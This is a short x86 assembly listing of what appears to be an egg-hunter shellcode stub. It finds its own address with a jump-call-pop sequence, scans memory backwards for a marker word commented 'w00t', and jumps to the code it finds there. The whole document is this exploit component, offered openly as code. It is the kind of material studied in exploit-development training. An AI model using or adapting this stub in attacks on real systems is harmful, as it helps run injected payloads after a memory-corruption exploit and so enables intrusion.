global _start            

section .text
_start:

    jmp short call_shellcode

shellcode:
  pop     ecx
  sub     ecx, 23
loop:
  cmp     word [ecx], 0x5951  ; w00t
  loopnz  loop                ; dec ecx, jump
  jmp ecx                     ; jump to shellcode

call_shellcode:
  call    shellcode